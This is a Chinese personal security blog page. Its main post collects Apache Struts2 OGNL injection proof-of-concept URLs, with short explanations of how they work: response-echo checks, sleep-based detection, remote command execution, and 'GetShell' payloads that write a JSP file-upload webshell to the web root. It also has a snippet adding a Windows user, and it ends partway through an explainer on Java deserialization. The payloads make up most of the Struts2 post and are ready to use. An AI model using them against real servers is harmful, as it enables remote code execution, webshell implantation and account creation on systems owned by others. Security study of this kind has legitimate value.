<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>SY0U&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="一半技术 一半生活">
<meta property="og:type" content="website">
<meta property="og:title" content="SY0U&#39;s Blog">
<meta property="og:url" content="http://wsygoogol.github.io/index.html">
<meta property="og:site_name" content="SY0U&#39;s Blog">
<meta property="og:description" content="一半技术 一半生活">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="SY0U&#39;s Blog">
<meta name="twitter:description" content="一半技术 一半生活">
  
    <link rel="alternate" href="/atom.xml" title="SY0U&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">SY0U&#39;s Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wsygoogol.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-About-the-Blog" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/06/08/About-the-Blog/" class="article-date">
  <time datetime="2016-06-08T10:54:05.000Z" itemprop="datePublished">2016-06-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/06/08/About-the-Blog/">About the Blog</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>之前的用wordpress + mysql在阿里云搭建了一套博客，域名是( <a href="http://wsygoogol.cn" target="_blank" rel="external">http://wsygoogol.cn</a> )维护成本比较高，被人用扫描器扫一下直接被阿里云下线。加上也懒得去写博客了，域名和主机都因为未续费被回收了。<br>最近两年的漏洞分析和技术分享文章都发在公司博客、公司内网论坛、公司公众号上，比较乱。平时看文章看到好多人都在用Hexo，一直想弄一个，因为一些事情耽搁了，最近试了一下还真不错。就在github上搭一个，虽然由于大家都懂的的原因有点慢。但是流量应该不会太大，需求也没那么多，暂时先用着，如果有需求再迁移吧。<br>我决定用这个博客，记录工作和学习中的踩过的坑，把学到的知识和经验分享出来。我也经常在知乎上回答一些问题，写一些生活的感悟和读书笔记。如果好的，以后也会同步过来。<br>所谓一半技术，一半生活。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2016/06/08/About-the-Blog/" data-id="cj5p9bvx90002d01b7z0a25fz" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-解密Struts2-POC" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/07/18/解密Struts2-POC/" class="article-date">
  <time datetime="2017-07-18T07:44:42.000Z" itemprop="datePublished">2017-07-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/07/18/解密Struts2-POC/">解密Struts2 POC</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>struts的威力大家都知道，这里找几个有代表性的POC讲一下，做一个记录。</p>
<p>#####回显POC<br>poc1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\43_memberAccess.allowStaticMethodAccess'</span>)(a)=<span class="literal">true</span>&amp;(b)((<span class="string">'\43context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\75false'</span>)(b))&amp;(<span class="string">'\43c'</span>)((<span class="string">'\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET'</span>)(c))&amp;(g)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i2)((<span class="string">'\43xman.getWriter().println(%22[/ok]%22)'</span>)(d))&amp;(i99)((<span class="string">'\43xman.getWriter().close()'</span>)(d))</div></pre></td></tr></table></figure></p>
<p>poc2（类型转换漏洞需要把POC加在整型参数上）:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22))%2b'</span></div></pre></td></tr></table></figure></p>
<p>poc3（需要注意这里也必须是加载一个String(字符串类型)的参数后面，使用的时候把URL里面的两个foo替换成目标参数（注意POC里面还有个foo））:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?foo=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess[%22allowStaticMethodAccess%22]=new%20java.lang.Boolean(<span class="literal">true</span>),@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22))&amp;z[(foo)(<span class="string">'meh'</span>)]=<span class="literal">true</span></div></pre></td></tr></table></figure></p>
<p>poc4<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=<span class="literal">true</span>,%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23s3cur1ty.println(%22[/ok]%22),%23s3cur1ty.close())(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]</div></pre></td></tr></table></figure></p>
<p>poc5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23response=@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22),%23response.close()&#125;</span></div></pre></td></tr></table></figure></p>
<p>poc6<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/$%7B%23_memberAccess[%22allowStaticMethodAccess%22]=<span class="literal">true</span>,%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23resp.println(%22[ok]%22),%23resp.close()%7D.action</div></pre></td></tr></table></figure></p>
<p>poc7<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/Struts2/test.action?redirect:<span class="variable">$&#123;%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.println('[/ok]'),%23w.flush(),%23w.close()&#125;</span></div></pre></td></tr></table></figure></p>
<p>@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22)其实是静态调用ServletActionContext; ServletActionContext能够拿到真正的HttpServletRequest、HttpServletResponse、ServletContext。拿到一个HttpServletResponse响应对象后就可以调用getWriter方法(返回的是PrintWriter)让Servlet容器上输出[/ok]了，而其他的POC也都做了同样的事：拿到HttpServletResponse，然后输出[/ok]。其中的allowStaticMethodAccess在Struts2里面默认是false，也就是默认不允许静态方法调用。</p>
<p>#####精确判断是否存在（延迟判断）:<br>poc1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\43_memberAccess.allowStaticMethodAccess'</span>)(a)=<span class="literal">true</span>&amp;(b)((<span class="string">'\43context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\75false'</span>)(b))&amp;(<span class="string">'\43c'</span>)((<span class="string">'\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET'</span>)(c))&amp;(d)((<span class="string">'@java.lang.Thread@sleep(5000)'</span>)(d))</div></pre></td></tr></table></figure></p>
<p>poc2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000))%2b'</span></div></pre></td></tr></table></figure></p>
<p>poc3<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,@java.lang.Thread@sleep(5000))(meh%29&amp;z[%28foo%29%28%27meh%27%29]=<span class="literal">true</span></div></pre></td></tr></table></figure></p>
<p>poc4<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3d+new+java.lang.Boolean(<span class="literal">false</span>)%2c+%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c+%23a%3d%40java.lang.Thread@sleep(5000))(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]</div></pre></td></tr></table></figure></p>
<p>poc5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000)&#125;</span></div></pre></td></tr></table></figure></p>
<p>poc6<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000)&#125;</span>.action</div></pre></td></tr></table></figure></p>
<p>之前很多的利用工具都是让线程睡一段时间再去计算时间差来判断漏洞是否存在。这样比之前的回显更靠谱，缺点就是慢。而实现这个POC的方法同样是非常的简单其实就是静态调用java.lang.Thread.sleep(5000)就行了。而命令执行原理也是一样的。</p>
<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>关于回显：webStr\75new\40byte[100] 修改为合适的长度。<br>poc1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\43_memberAccess.allowStaticMethodAccess'</span>)(a)=<span class="literal">true</span>&amp;(b)((<span class="string">'\43context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\75false'</span>)(b))&amp;(<span class="string">'\43c'</span>)((<span class="string">'\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET'</span>)(c))&amp;(g)((<span class="string">'\43req\75@org.apache.struts2.ServletActionContext@getRequest()'</span>)(d))&amp;(h)((<span class="string">'\43webRootzpro\75@java.lang.Runtime@getRuntime().exec(\43req.getParameter(%22cmd%22))'</span>)(d))&amp;(i)((<span class="string">'\43webRootzproreader\75new\40java.io.DataInputStream(\43webRootzpro.getInputStream())'</span>)(d))&amp;(i01)((<span class="string">'\43webStr\75new\40byte[100]'</span>)(d))&amp;(i1)((<span class="string">'\43webRootzproreader.readFully(\43webStr)'</span>)(d))&amp;(i111)(<span class="string">'\43webStr12\75new\40java.lang.String(\43webStr)'</span>)(d))&amp;(i2)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i2)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i95)((<span class="string">'\43xman.getWriter().println(\43webStr12)'</span>)(d))&amp;(i99)((<span class="string">'\43xman.getWriter().close()'</span>)(d))&amp;cmd=cmd%20/c%20ipconfig</div></pre></td></tr></table></figure></p>
<p>poc2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().exec(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[100],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result))%2b'</span>&amp;cmd=cmd%20/c%20ipconfig</div></pre></td></tr></table></figure></p>
<p>poc3<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/freecms/login_login.do?user.loginname=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess[%22allowStaticMethodAccess%22]=new%20java.lang.Boolean(<span class="literal">true</span>),%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().<span class="built_in">exec</span>(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[1000],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result))&amp;z[(user.loginname)(<span class="string">'meh'</span>)]=<span class="literal">true</span>&amp;cmd=cmd%20/c%20set</div></pre></td></tr></table></figure></p>
<p>poc4<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=<span class="literal">true</span>,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23a=%40java.lang.Runtime%40getRuntime().<span class="built_in">exec</span>(%23req.getParameter(%22cmd%22)).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char%5b50000%5d,%23c.read(%23d),%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23s3cur1ty.println(%23d),%23s3cur1ty.close())(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]&amp;cmd=cmd%20/c%20netstat%20-an</div></pre></td></tr></table></figure></p>
<p>poc5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().exec(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[1000],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result),%23response.close()&#125;</span>&amp;cmd=cmd%20/c%20set</div></pre></td></tr></table></figure></p>
<p>poc6<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/struts2-blank/example/HelloWorld.action?redirect:<span class="variable">$&#123;%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]&#123;'netstat','-an'&#125;</span>)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(<span class="string">'com.opensymphony.xwork2.dispatcher.HttpServletResponse'</span>),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()&#125;</div></pre></td></tr></table></figure></p>
<p>其实在Java里面要去执行一个命令的方式都是一样的，简单的静态调用方式<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(<span class="string">"net user selina 123 /add"</span>);</div></pre></td></tr></table></figure></p>
<p>就可以执行任意命令了。Exec执行后返回的类型是java.lang.Process。Process是一个抽象类，final class ProcessImpl extends Process也是Process的具体实现。而命令执行后返回的Process可以通过<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">public OutputStream getOutputStream()</div><div class="line">public InputStream getInputStream()</div></pre></td></tr></table></figure></p>
<p>直接输入输出流，拿到InputStream之后直接读取就能够获取到命令执行的结果了。而在Ognl里面不能够用正常的方式去读取流，而多是用DataInputStream的readFully或BufferedReader的read方法全部读取或者按byte读取的。因为可能会读取到半个中文字符，所以可能会存在乱码问题，自定义每次要读取的大小就可以了。POC当中的/c 不是必须的，执行dir之类的命令可以加上。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Process java.lang.Runtime.exec(String <span class="built_in">command</span>) throws IOException</div></pre></td></tr></table></figure></p>
<p>#####GetShell<br>poc1:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\u0023_memberAccess[\'</span>allowStaticMethodAccess\<span class="string">']'</span>)(meh)=<span class="literal">true</span>&amp;(aaa)((<span class="string">'\u0023context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\u003d\u0023foo'</span>)(\u0023foo\u003dnew%20java.lang.Boolean(%22false%22)))&amp;(i1)((<span class="string">'\43req\75@org.apache.struts2.ServletActionContext@getRequest()'</span>)(d))&amp;(i12)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i13)((<span class="string">'\43xman.getWriter().println(\43req.getServletContext().getRealPath(%22\u005c%22))'</span>)(d))&amp;(i2)((<span class="string">'\43fos\75new\40java.io.FileOutputStream(new\40java.lang.StringBuilder(\43req.getRealPath(%22\u005c%22)).append(@java.io.File@separator).append(%22css3.jsp%22).toString())'</span>)(d))&amp;(i3)((<span class="string">'\43fos.write(\43req.getParameter(%22p%22).getBytes())'</span>)(d))&amp;(i4)((<span class="string">'\43fos.close()'</span>)(d))&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>poc2（类型转换漏洞需要把POC加在整型参数上）:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close())%2b'</span>%20&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>poc3（需要注意这里也必须是加载一个String(字符串类型)的参数后面，使用的时候把URL里面的两个foo替换成目标参数（注意POC里面还有个foo））:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close())(meh%29&amp;z[%28foo%29%28%27meh%27%29]=<span class="literal">true</span>&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>poc4:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=<span class="literal">true</span>,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close()(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>poc5:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close()&#125;</span>&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>poc6:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/Struts2/test.action?redirect:<span class="variable">$&#123;%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22).replaceAll("\\\\", "/"),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()&#125;</span>&amp;c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
<p>比如POC4当中首先就是把allowStaticMethodAccess改为trute即允许静态方法访问。然后再获取请求对象，从请求对象中获取网站项目的根路径，然后在根目录下新建一个css3.jsp，而css3.jsp的内容同样来自于客户端的请求。POC4中的p就是传入的参数，只要获取p就能获取到内容完成文件的写入了。之前已经说过Java不是动态的脚本语言，所以没有eval。不能像PHP那样直接用eval去动态执行，所以Java里面没有真正意义上的一句话木马。菜刀只是提供了一些常用的一句话的功能的具体的实现，所以菜刀的代码会很长，因为这些代码在有eval的情况下是可以通过发送请求的形式去构造的，在这里就必须把代码给上传到服务器去编译成执行。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2017/07/18/解密Struts2-POC/" data-id="cj5p9bvxp000cd01bb4sevlle" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-甲乙方安全需求与痛点" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/07/04/甲乙方安全需求与痛点/" class="article-date">
  <time datetime="2017-07-04T05:57:12.000Z" itemprop="datePublished">2017-07-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/07/04/甲乙方安全需求与痛点/">甲乙方安全需求与痛点</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2017/07/04/甲乙方安全需求与痛点/" data-id="cj5p9bvxh0006d01byuhjy711" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-Java反序列化漏洞" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/10/10/Java反序列化漏洞/" class="article-date">
  <time datetime="2016-10-10T03:46:54.000Z" itemprop="datePublished">2016-10-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/10/10/Java反序列化漏洞/">序列化和反序列化</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3><p>序列化：把对象转换为字节序列的过程。<br>反序列化：把字节序列恢复为对象的过程。<br><img src="/upload_image/7.png" alt=""></p>
<h5 id="JDK类库中的序列化API"><a href="#JDK类库中的序列化API" class="headerlink" title="JDK类库中的序列化API"></a>JDK类库中的序列化API</h5><p>java.io.ObjectOutputStream代表对象输出流，它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。<br>　　java.io.ObjectInputStream代表对象输入流，它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。<br><img src="/upload_image/8.png" alt=""><br><strong>在Java中，对象的序列化与反序列化被广泛应用到RMI(远程方法调用)及网络传输中。</strong></p>
<h5 id="Java序列化数据解析"><a href="#Java序列化数据解析" class="headerlink" title="Java序列化数据解析"></a>Java序列化数据解析</h5><p>数据开头为“AC ED 00 05”，数据内容包含了包名与类名、类中包含的变量名称、类型及变量的值。<br><img src="/upload_image/9.png" alt=""><br>ava.io.ObjectStreamConstants类中定义了STREAM_MAGIC与STREAM_VERSION，查看JDK1.5、1.6、1.7、1.8的ObjectStreamConstants类，STREAM_MAGIC值均为0xaced，STREAM_VERSION值均为5。</p>
<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>Breenmachine的这篇blog让java反序列化漏洞得到更多的关注，他介绍了如何利用Java反序列化漏洞，来攻击最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，实现远程代码执行。<br><img src="/upload_image/10.png" alt=""></p>
<h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>如果Java应用对用户输入，即不可信数据没有进行校验而直接做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。</p>
<h3 id="Apache-Commons-Collections"><a href="#Apache-Commons-Collections" class="headerlink" title="Apache Commons Collections"></a>Apache Commons Collections</h3><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。<br>该漏洞的出现的根源在CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法，并且该方法在相关对象反序列化时并未进行任何校验.<br>Apache Commons Collections中提供了一个Transformer的类，这个接口的的功能就是把一个对象转换为另一个对象。<br><img src="/upload_image/11.png" alt=""><br>图上红框标注的是java反序列化漏洞的poc包含的类。<br>invokeTransformer：Transformer implementation that creates a new object instance by reflection.（通过反射，返回一个对象）<br>ChainedTransformer：Transformer implementation that chains the specified transformers together.（把transformer连接成一条链，对一个对象依次通过链条内的每一个transformer进行转换）<br>ConstantTransformer：Transformer implementation that returns the same constant each time.（把一个对象转化为常量，并返回）<br>InvokerTransformer是比较关键的一个类，我们来看看它的实现：<br><img src="/upload_image/18.png" 